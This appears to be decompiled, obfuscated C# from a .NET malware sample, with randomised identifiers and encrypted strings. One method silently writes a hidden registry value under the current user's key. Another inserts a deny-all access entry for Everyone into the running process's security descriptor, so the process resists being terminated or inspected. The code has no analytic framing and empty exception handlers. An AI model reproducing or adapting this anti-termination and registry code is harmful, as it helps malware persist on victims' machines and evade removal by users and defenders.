using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bpbWYHKNCNX;

internal sealed class pvNHzBspAdKB
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr zeQqpBPyxPUItx, int SyUaPktFtisik, [Out] byte[] IhnrMgsGjrhFq, uint jlfCQaWsfSTum, out uint tcSRTTYkkmQ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr dGMuUyLLtwno, int LsBcFSKfJarGJ, [In] byte[] DuMtiRrfwLqrjgeH);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void vdtyGwncmIcL(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107406881)));
			registryKey.SetValue(xWcMxnuhDQYJl.QqgSuZNWThrmn(getString_0(107406232)), getString_0(107407935));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor kwoGddBZUdJY(IntPtr intptr_0)
	{
		byte[] ihnrMgsGjrhFq = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, ihnrMgsGjrhFq, 0u, out var tcSRTTYkkmQ);
		if ((long)tcSRTTYkkmQ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, ihnrMgsGjrhFq = new byte[tcSRTTYkkmQ], tcSRTTYkkmQ, out tcSRTTYkkmQ))
		{
			return null;
		}
		return new RawSecurityDescriptor(ihnrMgsGjrhFq, 0);
	}

	private void tWQgIzEbRV(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void bjuNMFwwCYpCzk()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = kwoGddBZUdJY(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			tWQgIzEbRV(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static pvNHzBspAdKB()
	{
		Strings.CreateGetStringDelegate(typeof(pvNHzBspAdKB));
	}
}
